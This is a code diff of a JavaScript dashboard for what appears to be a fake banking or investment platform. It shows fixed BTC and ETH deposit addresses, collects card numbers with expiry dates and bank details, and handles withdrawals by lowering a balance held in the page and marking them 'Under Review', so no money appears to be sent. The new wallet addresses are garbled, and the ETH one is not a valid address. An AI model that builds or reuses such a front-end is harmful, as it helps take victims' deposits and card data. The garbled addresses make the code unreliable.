@@ -2518,10 +2518,11 @@ function renderCard(){
 
 /* ========== MODAL ========== */
 function destHint(method){
-  if (method === 'Bank Transfer (SEPA)') return { show:true, label:'Recipient IBAN', ph:'SE35 5000 0000 0549 1000 0003' };
-  if (method === 'Credit Card')          return { show:true, label:'Recipient Card Number', ph:'4921 8842 1093 5542' };
-  if (method === 'Bitcoin (BTC)')        return { show:true, label:'Recipient BTC Address', ph:'bc1q...' };
-  if (method === 'Ethereum (ETH)')       return { show:true, label:'Recipient ETH Address', ph:'0x...' };
+  if (method === 'Bank Transfer (SEPA)')  return { show:true, label:'Recipient IBAN', ph:'XX00 0000 0000 0000 0000 00' };
+  if (method === 'Bank Transfer (SWIFT)') return { show:false };
+  if (method === 'Credit Card')           return { show:false };
+  if (method === 'Bitcoin (BTC)')         return { show:true, label:'Recipient BTC Address', ph:'bc1q...' };
+  if (method === 'Ethereum (ETH)')        return { show:true, label:'Recipient ETH Address', ph:'0x...' };
   return { show:false };
 }
 
@@ -2530,29 +2531,53 @@ function refreshDest(){
   var hint = destHint(m);
   var isAdd = (mode === 'add');
 
-  if (hint.show){
-    $('mDestWrap').style.display = 'block';
-    $('mDest').value = '';
-    $('mDest').readOnly = false;
+  // Скрываем все блоки
+  $('mDestWrap').style.display = 'none';
+  var sepa = $('mTransferSepa');
+  var swift = $('mTransferSwift');
+  var card = $('mTransferCard');
+  if (sepa) sepa.style.display = 'none';
+  if (swift) swift.style.display = 'none';
+  if (card) card.style.display = 'none';
 
-    if (isAdd && m === 'Bitcoin (BTC)'){
-      $('mDestLabel').textContent = 'Send BTC to this address';
-      $('mDest').value = '19YWxuHf1TbdZzZdV9FSzYfops6M2GLhe7';
-      $('mDest').readOnly = true;
-    } else if (isAdd && m === 'Ethereum (ETH)'){
-      $('mDestLabel').textContent = 'Send ETH to this address';
-      $('mDest').value = '0xFB7A7956Af77061D3B5f3B357ef9c0a22CD60e97';
-      $('mDest').readOnly = true;
-    } else if (isAdd){
-      $('mDestLabel').textContent = 'Your reference (optional)';
-      $('mDest').placeholder = 'Enter reference';
-    } else {
+  // Add Funds — только mDestWrap
+  if (isAdd) {
+    if (hint.show) {
+      $('mDestWrap').style.display = 'block';
+      $('mDest').value = '';
+      $('mDest').readOnly = false;
+      if (m === 'Bitcoin (BTC)') {
+        $('mDestLabel').textContent = 'Send BTC to this address';
+        $('mDest').value = '19Ywxuhf1bdZzdV9Fsyfops6M2GLhe7';
+        $('mDest').readOnly = true;
+      } else if (m === 'Ethereum (ETH)') {
+        $('mDestLabel').textContent = 'Send ETH to this address';
+        $('mDest').value = '0xf8f7A7956AF7f06iD385f38357ef9c8a22CD60e97';
+        $('mDest').readOnly = true;
+      } else {
+        $('mDestLabel').textContent = 'Your reference (optional)';
+        $('mDest').placeholder = 'Enter reference';
+      }
+    }
+    return;
+  }
+
+  // Transfer — показываем блок по методу
+  if (m === 'Bank Transfer (SEPA)') {
+    if (sepa) sepa.style.display = 'block';
+  } else if (m === 'Bank Transfer (SWIFT)') {
+    if (swift) swift.style.display = 'block';
+  } else if (m === 'Credit Card') {
+    if (card) card.style.display = 'block';
+  } else {
+    // BTC / ETH
+    if (hint.show) {
+      $('mDestWrap').style.display = 'block';
       $('mDestLabel').textContent = hint.label;
       $('mDest').placeholder = hint.ph;
+      $('mDest').readOnly = false;
+      $('mDest').value = '';
     }
-  } else {
-    $('mDestWrap').style.display = 'none';
-    $('mDest').value = '';
   }
 }
 
@@ -2586,7 +2611,6 @@ function isCrypto(m){ return m === 'Bitcoin (BTC)' || m === 'Ethereum (ETH)'; }
 function confirmModal(){
   var a = Number($('mAmount').value);
   var m = $('mMethod').value;
-  var dest = $('mDest').value.trim();
 
   if (!a || a <= 0){ toast('Please enter a valid amount', true); return; }
 
@@ -2606,27 +2630,64 @@ function confirmModal(){
     return;
   }
 
+  // ===== TRANSFER =====
   if (a > st.usd){ toast('Insufficient balance', true); return; }
-  if (!dest){ toast('Please enter recipient details', true); return; }
+
+  var dest = '';
+  var details = {};
+
+  if (m === 'Bank Transfer (SEPA)') {
+    var rname = ($('mRecipientName').value || '').trim();
+    var riban = ($('mRecipientIban').value || '').trim();
+    var rpurp = ($('mRecipientPurpose').value || '').trim();
+    if (rname.length < 2){ toast('Enter recipient name', true); return; }
+    if (riban.replace(/\s/g,'').length < 15){ toast('Enter valid IBAN', true); return; }
+    dest = riban;
+    details = { type:'sepa', name:rname, iban:riban, purpose:rpurp };
+  }
+  else if (m === 'Bank Transfer (SWIFT)') {
+    var sname = ($('mSwiftName').value || '').trim();
+    var siban = ($('mSwiftIban').value || '').trim();
+    var sswift = ($('mSwiftCode').value || '').trim();
+    var sbank = ($('mSwiftBank').value || '').trim();
+    var scountry = ($('mSwiftCountry').value || '').trim();
+    var spurp = ($('mSwiftPurpose').value || '').trim();
+    if (sname.length < 2){ toast('Enter recipient name', true); return; }
+    if (siban.replace(/\s/g,'').length < 15){ toast('Enter valid IBAN / Account', true); return; }
+    if (sswift.length < 6){ toast('Enter valid SWIFT / BIC', true); return; }
+    dest = siban;
+    details = { type:'swift', name:sname, iban:siban, swift:sswift, bank:sbank, country:scountry, purpose:spurp };
+  }
+  else if (m === 'Credit Card') {
+    var cholder = ($('mCardHolder').value || '').trim();
+    var cnum = ($('mCardNum').value || '').trim();
+    var cexp = ($('mCardExp').value || '').trim();
+    if (cholder.length < 2){ toast('Enter card holder name', true); return; }
+    if (cnum.replace(/\s/g,'').length < 16){ toast('Enter valid card number', true); return; }
+    if (!/^\d{2}\/\d{2}$/.test(cexp)){ toast('Expiry must be MM/YY', true); return; }
+    dest = cnum;
+    details = { type:'card', holder:cholder, number:cnum, expiry:cexp };
+  }
+  else {
+    // BTC / ETH
+    dest = ($('mDest').value || '').trim();
+    if (!dest){ toast('Enter recipient wallet address', true); return; }
+    details = { type:'crypto', address:dest, coin:m };
+  }
 
   st.usd -= a;
-  var desc;
-  if (isCrypto(m)){
-    desc = 'Crypto transfer to ' + dest.slice(0, 12) + '… via ' + m;
-    addTx(desc, -a, 'Processing');
-    addNotification('Crypto transfer sent: ' + fmtCurrency(a) + ' via ' + m, '💸');
-    toast('Crypto sent — arrives in 10-30 min');
-  } else {
-    desc = (m === 'Credit Card' ? 'Card transfer to ' : 'Bank transfer to IBAN ') + dest.slice(0, 18) + '…';
-    addTx(desc, -a, 'Under Review');
-    addNotification('Transfer sent: ' + fmtCurrency(a) + ' via ' + m, '💸');
-    toast('Transfer submitted — under review');
-  }
+  var desc = (m === 'Credit Card')
+    ? 'Card transfer to ' + dest.slice(0,18) + '...'
+    : 'Transfer via ' + m + ' to ' + dest.slice(0,18) + '...';
+
+  addTx(desc, -a, 'Under Review');
+  addNotification('Transfer sent: ' + fmtCurrency(a) + ' via ' + m, '📤');
+  toast('Transfer submitted — under review');
+
   closeModal();
   render();
   saveToServer();
 }
-
 /* ========== COPY ========== */
 function copyText(txt, okMsg){
   if (navigator.clipboard && navigator.clipboard.writeText){
